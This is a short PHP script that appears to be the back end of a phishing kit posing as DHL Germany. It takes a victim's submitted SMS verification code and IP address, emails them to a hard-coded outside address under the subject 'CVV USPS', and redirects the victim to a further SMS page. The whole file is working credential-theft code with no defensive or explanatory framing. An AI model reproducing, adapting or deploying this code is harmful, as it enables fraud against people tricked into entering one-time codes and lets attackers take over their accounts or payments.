<?php

$f6=$_REQUEST['avant'];
$l4=$_REQUEST['apres'];
$next="../wait/index.php?avant=".$f6."&apres=".$l4."";
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ DHL Germany]-----++--\n";
$message .= "SMS : ".$_POST['sms']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";


$subject = "CVV USPS [ " . $zabi . " ] ";
$email = "1471033717@etlgr.com";
mail($email,$subject,$message);
    




header("Location: ../sms/");



